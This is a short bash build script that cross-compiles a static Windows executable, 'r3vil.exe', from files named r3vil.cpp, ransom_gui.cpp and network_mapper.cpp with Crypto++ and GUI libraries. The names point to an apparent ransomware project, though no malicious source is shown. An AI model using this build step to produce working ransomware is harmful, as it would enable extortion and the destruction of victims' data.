#!/bin/bash

x86_64-w64-mingw32-g++ -std=c++17 -o r3vil.exe \
    r3vil.cpp src/ransom_gui.cpp src/network_mapper.cpp \
    imgui/*.cpp imgui/backends/imgui_impl_glfw.cpp imgui/backends/imgui_impl_opengl3.cpp \
    -Iimgui -Iimgui/backends \
    -I/mingw64/include -L/mingw64/lib \
    -lcryptopp -lglfw3 -lopengl32 -lgdi32 -ladvapi32 -lshell32 -lole32 -lwbemuuid \
    -luser32 -lkernel32 -lcomdlg32 -lwinmm -limm32 -loleaut32 \
    -static -static-libgcc -static-libstdc++ -static-libwinpthread \
    -O2 -DWIN32 -D_WIN32 -municode -mwindows
